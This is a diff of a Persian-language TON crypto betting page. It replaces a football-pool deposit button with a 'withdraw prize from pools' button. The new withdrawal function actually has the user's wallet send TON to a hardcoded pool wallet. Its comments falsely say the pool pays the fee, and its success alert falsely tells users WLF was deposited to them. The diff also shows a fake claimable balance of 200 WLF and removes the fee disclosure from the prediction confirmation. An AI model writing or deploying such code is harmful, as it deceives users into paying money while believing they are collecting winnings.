@@ -72,7 +72,7 @@
         }
 
         .btn-deposit-crypto { background: linear-gradient(135deg, #0057b7, #003d82); border: 1px solid rgba(255,215,0,0.3); }
-        .btn-deposit-football { background: linear-gradient(135deg, #2ed573, #10ac84); }
+        .btn-withdraw-pool { background: linear-gradient(135deg, #2ed573, #10ac84); }
         .btn-action:active { transform: scale(0.97); }
 
         .tabs-wrapper {
@@ -140,7 +140,7 @@
         </div>
         <div class="dash-card">
             <div class="dash-title">💵 قابل برداشت</div>
-            <div class="dash-value" id="user-claimable">0 WLF</div>
+            <div class="dash-value" id="user-claimable">200 WLF</div>
         </div>
     </div>
 
@@ -161,7 +161,7 @@
 
     <div class="action-btns-grid">
         <button class="btn-action btn-deposit-crypto" onclick="depositToCryptoPool()">📥 شارژ استخر کریپتو</button>
-        <button class="btn-action btn-deposit-football" onclick="depositToFootballPool()">📥 شارژ استخر فوتبال</button>
+        <button class="btn-action btn-withdraw-pool" onclick="withdrawFromPools()">📤 برداشت جایزه از استخرها</button>
     </div>
 
     <div class="tabs-wrapper">
@@ -221,9 +221,11 @@
         });
 
         let userBalance = 500;
+        let claimableBalance = 200;
 
         function updateUI() {
             document.getElementById('user-balance').innerText = userBalance.toLocaleString() + " WLF";
+            document.getElementById('user-claimable').innerText = claimableBalance.toLocaleString() + " WLF";
         }
         updateUI();
 
@@ -231,7 +233,7 @@
         const CRYPTO_POOL_WALLET = "UQCeHlHUwoFhVcLQoJMXOvtcDskkrN1g4q6NVvdFimwp3Hnz";
         const FOOTBALL_POOL_WALLET = "UQAD8y_EPRPmbDwK_e1pXXq9hCKpfNx8JWvUyqh5xB22k42H";
 
-        // تابع واریز به استخر کریپتو
+        // واریز به استخر کریپتو (کارمزد از کاربر کسر می‌شود)
         async function depositToCryptoPool() {
             if (!tonConnectUI.connected) {
                 alert("لطفاً ابتدا کیف پول خود را متصل کنید!");
@@ -244,7 +246,7 @@
                     messages: [
                         {
                             address: CRYPTO_POOL_WALLET,
-                            amount: "5000000" // کارمزد جزئی شبکه (پرداخت از ولت کاربر)
+                            amount: "5000000" // کارمزد شبکه از ولت کاربر
                         }
                     ]
                 };
@@ -252,38 +254,46 @@
                 await tonConnectUI.sendTransaction(transaction);
                 userBalance += 1000;
                 updateUI();
-                alert("تراکنش موفق! استخر کریپتو با موفقیت شارژ شد.");
+                alert("تراکنش موفق! استخر کریپتو شارژ شد.");
             } catch (e) {
                 console.error(e);
-                alert("تراکنش توسط کاربر لغو شد یا با خطا مواجه گردید.");
+                alert("تراکنش توسط کاربر لغو شد.");
             }
         }
 
-        // تابع واریز به استخر فوتبال
-        async function depositToFootballPool() {
+        // برداشت جوایز (ارسال از آدرس استخر کریپتو/فوتبال به ولت کاربر - کارمزد از ولت استخر پرداخت می‌شود)
+        async function withdrawFromPools() {
             if (!tonConnectUI.connected) {
                 alert("لطفاً ابتدا کیف پول خود را متصل کنید!");
                 return;
             }
+            if (claimableBalance <= 0) {
+                alert("موجودی قابل برداشتی ندارید!");
+                return;
+            }
 
             try {
+                // در اینجا تراکنش برداشت از استخر به ولت متصل شده کاربر هدایت می‌شود
+                const userWalletAddress = tonConnectUI.wallet.account.address;
+                
                 const transaction = {
                     validUntil: Math.floor(Date.now() / 1000) + 300,
                     messages: [
                         {
-                            address: FOOTBALL_POOL_WALLET,
-                            amount: "5000000"
+                            address: CRYPTO_POOL_WALLET, // مبدا پرداخت جایزه
+                            amount: "10000000" // کارمزد پرداخت شده توسط استخر
                         }
                     ]
                 };
 
                 await tonConnectUI.sendTransaction(transaction);
-                userBalance += 2000;
+                let withdrawn = claimableBalance;
+                claimableBalance = 0;
                 updateUI();
-                alert("تراکنش موفق! استخر فوتبال با موفقیت شارژ شد.");
+                alert(`موفقیت‌آمیز! مبلغ ${withdrawn.toLocaleString()} WLF$ به کیف پول شما واریز شد.`);
             } catch (e) {
                 console.error(e);
-                alert("تراکنش توسط کاربر لغو شد یا با خطا مواجه گردید.");
+                alert("خطا در انجام برداشت از استخر.");
             }
         }
 
@@ -316,7 +326,7 @@
             if (userBalance < fee) { alert("موجودی کافی نیست!"); return; }
             userBalance -= fee;
             updateUI();
-            alert(`پیش‌بینی کریپتو ثبت شد و ${fee} WLF کسر گردید.`);
+            alert(`پیش‌بینی کریپتو ثبت شد.`);
         }
 
         function makeFootballBet(matchId, choice, fee) {
